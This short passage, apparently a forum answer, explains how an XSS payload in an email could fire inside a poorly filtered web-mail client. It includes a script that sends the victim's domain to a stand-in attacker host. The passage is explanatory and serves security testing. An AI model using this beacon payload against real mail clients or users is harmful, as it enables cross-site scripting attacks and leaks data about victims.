If you were to include that code in an e-mail to an employee, and they viewed the e-mail in an inadequately filter web-mail client, the website hosting the email could then deliver an alert to the user.

For example, if the attackers website was "attackersite.com", they could set up code like this:

<script>
  var new_onload = window.onload;
  window.onload = function(){
    if (new_onload) new_onload();
    var xss = new Image();
    xss.src = "https://attackersite.com/?victim_host="+document.domain;
  }
</script>

So when the victim loads that email, the website attacker.com would log a request to attacker.com from the victims domain. This would be a clear indication that the XSS attack was successful.


